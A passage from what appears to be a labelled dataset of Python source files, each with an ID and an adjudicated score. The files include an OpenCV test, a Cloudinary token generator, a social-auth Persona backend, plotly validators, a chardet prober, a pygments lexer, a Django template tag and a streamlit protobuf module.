377, 205],<<NEWL>>            #rect3<<NEWL>>             [153, 177, 196, 177],<<NEWL>>             [153, 277, 153, 179],<<NEWL>>             [153, 277, 196, 277],<<NEWL>>             [196, 177, 196, 277]]<<NEWL>><<NEWL>>        matches_counter = 0<<NEWL>><<NEWL>>        for i in range(len(testLines)):<<NEWL>>            for j in range(len(lines)):<<NEWL>>                if linesDiff(testLines[i], lines[j]) < eps:<<NEWL>>                    matches_counter += 1<<NEWL>><<NEWL>>        self.assertGreater(float(matches_counter) / len(testLines), .7)<<NEWL>><<NEWL>>        lines_acc = cv.HoughLinesWithAccumulator(dst, rho=1, theta=np.pi / 180, threshold=150, srn=0, stn=0)<<NEWL>>        self.assertEqual(lines_acc[0,0,2], 192.0)<<NEWL>>        self.assertEqual(lines_acc[1,0,2], 187.0)<<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    NewOpenCVTests.bootstrap()"
262	adjudicated	1	"import hashlib<<NEWL>>import hmac<<NEWL>>import re<<NEWL>>import time<<NEWL>>from binascii import a2b_hex<<NEWL>><<NEWL>><<NEWL>>AUTH_TOKEN_NAME = ""__cld_token__""<<NEWL>>AUTH_TOKEN_SEPARATOR = ""~""<<NEWL>>AUTH_TOKEN_UNSAFE_RE = r'([ ""#%&\'\/:;<=>?@\[\\\]^`{\|}~]+)'<<NEWL>><<NEWL>><<NEWL>>def generate(url=None, acl=None, start_time=None, duration=None,<<NEWL>>             expiration=None, ip=None, key=None, token_name=AUTH_TOKEN_NAME):<<NEWL>><<NEWL>>    if expiration is None:<<NEWL>>        if duration is not None:<<NEWL>>            start = start_time if start_time is not None else int(time.time())<<NEWL>>            expiration = start + duration<<NEWL>>        else:<<NEWL>>            raise Exception(""Must provide either expiration or duration"")<<NEWL>><<NEWL>>    if url is None and acl is None:<<NEWL>>        raise Exception(""Must provide either acl or url"")<<NEWL>><<NEWL>>    token_parts = []<<NEWL>>    if ip is not None:<<NEWL>>        token_parts.append(""ip="" + ip)<<NEWL>>    if start_time is not None:<<NEWL>>        token_parts.append(""st=%d"" % start_time)<<NEWL>>    token_parts.append(""exp=%d"" % expiration)<<NEWL>>    if acl is not None:<<NEWL>>        acl_list = acl if type(acl) is list else [acl]<<NEWL>>        acl_list = [_escape_to_lower(a) for a in acl_list] <<NEWL>>        token_parts.append(""acl=%s"" % ""!"".join(acl_list))<<NEWL>>    to_sign = list(token_parts)<<NEWL>>    if url is not None and acl is None:<<NEWL>>        to_sign.append(""url=%s"" % _escape_to_lower(url))<<NEWL>>    auth = _digest(AUTH_TOKEN_SEPARATOR.join(to_sign), key)<<NEWL>>    token_parts.append(""hmac=%s"" % auth)<<NEWL>>    return ""%(token_name)s=%(token)s"" % {""token_name"": token_name, ""token"": AUTH_TOKEN_SEPARATOR.join(token_parts)}<<NEWL>><<NEWL>><<NEWL>>def _digest(message, key):<<NEWL>>    bin_key = a2b_hex(key)<<NEWL>>    return hmac.new(bin_key, message.encode('utf-8'), hashlib.sha256).hexdigest()<<NEWL>><<NEWL>><<NEWL>>def _escape_to_lower(url):<<NEWL>>    # There is a circular import issue in this file, need to resolve it in the next major release<<NEWL>>    from cloudinary.utils import smart_escape<<NEWL>>    escaped_url = smart_escape(url, unsafe=AUTH_TOKEN_UNSAFE_RE)<<NEWL>>    escaped_url = re.sub(r""%[0-9A-F]{2}"", lambda x: x.group(0).lower(), escaped_url)<<NEWL>>    return escaped_url"
322	adjudicated	4	"""""""<<NEWL>>Mozilla Persona authentication backend, docs at:<<NEWL>>    https://python-social-auth.readthedocs.io/en/latest/backends/persona.html<<NEWL>>""""""<<NEWL>>from ..exceptions import AuthFailed, AuthMissingParameter<<NEWL>>from ..utils import handle_http_errors<<NEWL>>from .base import BaseAuth<<NEWL>><<NEWL>><<NEWL>>class PersonaAuth(BaseAuth):<<NEWL>>    """"""BrowserID authentication backend""""""<<NEWL>>    name = 'persona'<<NEWL>><<NEWL>>    def get_user_id(self, details, response):<<NEWL>>        """"""Use BrowserID email as ID""""""<<NEWL>>        return details['email']<<NEWL>><<NEWL>>    def get_user_details(self, response):<<NEWL>>        """"""Return user details, BrowserID only provides Email.""""""<<NEWL>>        # {'status': 'okay',<<NEWL>>        #  'audience': 'localhost:8000',<<NEWL>>        #  'expires': 1328983575529,<<NEWL>>        #  'email': 'name@server.com',<<NEWL>>        #  'issuer': 'browserid.org'}<<NEWL>>        email = response['email']<<NEWL>>        return {'username': email.split('@', 1)[0],<<NEWL>>                'email': email,<<NEWL>>                'fullname': '',<<NEWL>>                'first_name': '',<<NEWL>>                'last_name': ''}<<NEWL>><<NEWL>>    def extra_data(self, user, uid, response, details=None, *args, **kwargs):<<NEWL>>        """"""Return users extra data""""""<<NEWL>>        return {'audience': response['audience'],<<NEWL>>                'issuer': response['issuer']}<<NEWL>><<NEWL>>    @handle_http_errors<<NEWL>>    def auth_complete(self, *args, **kwargs):<<NEWL>>        """"""Completes login process, must return user instance""""""<<NEWL>>        if 'assertion' not in self.data:<<NEWL>>            raise AuthMissingParameter(self, 'assertion')<<NEWL>><<NEWL>>        response = self.get_json('https://browserid.org/verify', data={<<NEWL>>            'assertion': self.data['assertion'],<<NEWL>>            'audience': self.strategy.request_host()<<NEWL>>        }, method='POST')<<NEWL>>        if response.get('status') == 'failure':<<NEWL>>            raise AuthFailed(self)<<NEWL>>        kwargs.update({'response': response, 'backend': self})<<NEWL>>        return self.strategy.authenticate(*args, **kwargs)"
233	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
151	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""heatmapgl"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
380	adjudicated	0	######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is Mozilla Universal charset detector code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 2001<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#   Shy Shalom - original C code<<NEWL>>#   Proofpoint, Inc.<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .big5prober import Big5Prober<<NEWL>>from .charsetgroupprober import CharSetGroupProber<<NEWL>>from .cp949prober import CP949Prober<<NEWL>>from .enums import LanguageFilter<<NEWL>>from .eucjpprober import EUCJPProber<<NEWL>>from .euckrprober import EUCKRProber<<NEWL>>from .euctwprober import EUCTWProber<<NEWL>>from .gb2312prober import GB2312Prober<<NEWL>>from .johabprober import JOHABProber<<NEWL>>from .sjisprober import SJISProber<<NEWL>>from .utf8prober import UTF8Prober<<NEWL>><<NEWL>><<NEWL>>class MBCSGroupProber(CharSetGroupProber):<<NEWL>>    def __init__(self, lang_filter: LanguageFilter = LanguageFilter.NONE) -> None:<<NEWL>>        super().__init__(lang_filter=lang_filter)<<NEWL>>        self.probers = [<<NEWL>>            UTF8Prober(),<<NEWL>>            SJISProber(),<<NEWL>>            EUCJPProber(),<<NEWL>>            GB2312Prober(),<<NEWL>>            EUCKRProber(),<<NEWL>>            CP949Prober(),<<NEWL>>            Big5Prober(),<<NEWL>>            EUCTWProber(),<<NEWL>>            JOHABProber(),<<NEWL>>        ]<<NEWL>>        self.reset()
11	adjudicated	1	"""""""<<NEWL>>    pygments.lexers.capnproto<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the Cap'n Proto schema language.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, default<<NEWL>>from pygments.token import Text, Comment, Keyword, Name, Literal, Whitespace<<NEWL>><<NEWL>>__all__ = ['CapnProtoLexer']<<NEWL>><<NEWL>><<NEWL>>class CapnProtoLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For Cap'n Proto source.<<NEWL>><<NEWL>>    .. versionadded:: 2.2<<NEWL>>    """"""<<NEWL>>    name = 'Cap\'n Proto'<<NEWL>>    url = 'https://capnproto.org'<<NEWL>>    filenames = ['*.capnp']<<NEWL>>    aliases = ['capnp']<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'#.*?$', Comment.Single),<<NEWL>>            (r'@[0-9a-zA-Z]*', Name.Decorator),<<NEWL>>            (r'=', Literal, 'expression'),<<NEWL>>            (r':', Name.Class, 'type'),<<NEWL>>            (r'\$', Name.Attribute, 'annotation'),<<NEWL>>            (r'(struct|enum|interface|union|import|using|const|annotation|'<<NEWL>>             r'extends|in|of|on|as|with|from|fixed)\b',<<NEWL>>             Keyword),<<NEWL>>            (r'[\w.]+', Name),<<NEWL>>            (r'[^#@=:$\w\s]+', Text),<<NEWL>>            (r'\s+', Whitespace),<<NEWL>>        ],<<NEWL>>        'type': [<<NEWL>>            (r'[^][=;,(){}$]+', Name.Class),<<NEWL>>            (r'[\[(]', Name.Class, 'parentype'),<<NEWL>>            default('#pop'),<<NEWL>>        ],<<NEWL>>        'parentype': [<<NEWL>>            (r'[^][;()]+', Name.Class),<<NEWL>>            (r'[\[(]', Name.Class, '#push'),<<NEWL>>            (r'[])]', Name.Class, '#pop'),<<NEWL>>            default('#pop'),<<NEWL>>        ],<<NEWL>>        'expression': [<<NEWL>>            (r'[^][;,(){}$]+', Literal),<<NEWL>>            (r'[\[(]', Literal, 'parenexp'),<<NEWL>>            default('#pop'),<<NEWL>>        ],<<NEWL>>        'parenexp': [<<NEWL>>            (r'[^][;()]+', Literal),<<NEWL>>            (r'[\[(]', Literal, '#push'),<<NEWL>>            (r'[])]', Literal, '#pop'),<<NEWL>>            default('#pop'),<<NEWL>>        ],<<NEWL>>        'annotation': [<<NEWL>>            (r'[^][;,(){}=:]+', Name.Attribute),<<NEWL>>            (r'[\[(]', Name.Attribute, 'annexp'),<<NEWL>>            default('#pop'),<<NEWL>>        ],<<NEWL>>        'annexp': [<<NEWL>>            (r'[^][;()]+', Name.Attribute),<<NEWL>>            (r'[\[(]', Name.Attribute, '#push'),<<NEWL>>            (r'[])]', Name.Attribute, '#pop'),<<NEWL>>            default('#pop'),<<NEWL>>        ],<<NEWL>>    }"
291	adjudicated	4	"from django import template<<NEWL>>from django.contrib.admin.models import LogEntry<<NEWL>><<NEWL>>register = template.Library()<<NEWL>><<NEWL>><<NEWL>>class AdminLogNode(template.Node):<<NEWL>>    def __init__(self, limit, varname, user):<<NEWL>>        self.limit, self.varname, self.user = limit, varname, user<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return ""<GetAdminLog Node>""<<NEWL>><<NEWL>>    def render(self, context):<<NEWL>>        if self.user is None:<<NEWL>>            entries = LogEntry.objects.all()<<NEWL>>        else:<<NEWL>>            user_id = self.user<<NEWL>>            if not user_id.isdigit():<<NEWL>>                user_id = context[self.user].pk<<NEWL>>            entries = LogEntry.objects.filter(user__pk=user_id)<<NEWL>>        context[self.varname] = entries.select_related('content_type', 'user')[:int(self.limit)]<<NEWL>>        return ''<<NEWL>><<NEWL>><<NEWL>>@register.tag<<NEWL>>def get_admin_log(parser, token):<<NEWL>>    """"""<<NEWL>>    Populate a template variable with the admin log for the given criteria.<<NEWL>><<NEWL>>    Usage::<<NEWL>><<NEWL>>        {% get_admin_log [limit] as [varname] for_user [context_var_containing_user_obj] %}<<NEWL>><<NEWL>>    Examples::<<NEWL>><<NEWL>>        {% get_admin_log 10 as admin_log for_user 23 %}<<NEWL>>        {% get_admin_log 10 as admin_log for_user user %}<<NEWL>>        {% get_admin_log 10 as admin_log %}<<NEWL>><<NEWL>>    Note that ``context_var_containing_user_obj`` can be a hard-coded integer<<NEWL>>    (user ID) or the name of a template context variable containing the user<<NEWL>>    object whose ID you want.<<NEWL>>    """"""<<NEWL>>    tokens = token.contents.split()<<NEWL>>    if len(tokens) < 4:<<NEWL>>        raise template.TemplateSyntaxError(<<NEWL>>            ""'get_admin_log' statements require two arguments"")<<NEWL>>    if not tokens[1].isdigit():<<NEWL>>        raise template.TemplateSyntaxError(<<NEWL>>            ""First argument to 'get_admin_log' must be an integer"")<<NEWL>>    if tokens[2] != 'as':<<NEWL>>        raise template.TemplateSyntaxError(<<NEWL>>            ""Second argument to 'get_admin_log' must be 'as'"")<<NEWL>>    if len(tokens) > 4:<<NEWL>>        if tokens[4] != 'for_user':<<NEWL>>            raise template.TemplateSyntaxError(<<NEWL>>                ""Fourth argument to 'get_admin_log' must be 'for_user'"")<<NEWL>>    return AdminLogNode(limit=tokens[1], varname=tokens[3], user=(tokens[5] if len(tokens) > 5 else None))"
100	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""icicle"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
40	adjudicated	1	"# -*- coding: utf-8 -*-<<NEWL>># Generated by the protocol buffer compiler.  DO NOT EDIT!<<NEWL>># source: streamlit/proto/Favicon.proto<<NEWL>><<NEWL>>from google.protobuf import descriptor as _descriptor<<NEWL>>from google.protobuf import message as _message<<NEWL>>from google.protobuf import reflection as _reflection<<NEWL>>from google.protobuf import symbol_database as _symbol_database<<NEWL>># @@protoc_insertion_point(imports)<<NEWL>><<NEWL>>_sym_db = _symbol_database.Default()<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>DESCRIPTOR = _descriptor.FileDescriptor(<<NEWL>>  name='streamlit/proto/Favicon.proto',<<NEWL>>  package='',<<NEWL>>  syntax='proto3',<<NEWL>>  serialized_options=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  serialized_pb=b'\n\x1dstreamlit/proto/Favicon.proto\""\x16\n\x07\x46\x61vicon\x12\x0b\n\x03url\x18\x01 \x01(\tb\x06proto3'<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>_FAVICON = _descriptor.Descriptor(<<NEWL>>  name='Favicon',<<NEWL>>  full_name='Favicon',<<NEWL>>  filename=None,<<NEWL>>  file=DESCRIPTOR,<<NEWL>>  containing_type=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  fields=[<<NEWL>>    _descriptor.FieldDescriptor(<<NEWL>>      name='url', full_name='Favicon.url', index=0,<<NEWL>>      number=1, type=9, cpp_type=9, label=1,<<NEWL>>      has_default_value=False, default_value=b"""".decode('utf-8'),<<NEWL>>      message_type=None, enum_type=None, containing_type=None,<<NEWL>>      is_extension=False, extension_scope=None,<<NEWL>>      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),<<NEWL>>  ],<<NEWL>>  extensions=[<<NEWL>>  ],<<NEWL>>  nested_types=[],<<NEWL>>  enum_types=[<<NEWL>>  ],<<NEWL>>  serialized_options=None,<<NEWL>>  is_extendable=False,<<NEWL>>  syntax='proto3',<<NEWL>>  extension_ranges=[],<<NEWL>>  oneofs=[<<NEWL>>  ],<<NEWL>>  serialized_start=33,<<NEWL>>  serialized_end=55,<<NEWL>>)<<NEWL>><<NEWL>>DESCRIPTOR.message_types_by_name['Favicon'] = _FAVICON<<NEWL>>_sym_db.RegisterFileDescriptor(DESCRIPTOR)<<NEWL>><<NEWL>>Favicon = _reflection.GeneratedProtocolMessageType('Favicon', (_message.Message,), {<<NEWL>>  'DESCRIPTOR' : _FAVICON,<<NEWL>>  '__module__' : 'streamlit.proto.Favicon_pb2'<<NEWL>>  # @@protoc_insertion_point(class_scope:Favicon)<<NEWL>>  })<<NEWL>>_sym_db.RegisterMessage(Favicon)<<NEWL>><<NEWL>><<NEWL>># @@protoc_insertion_point(module_scope)"
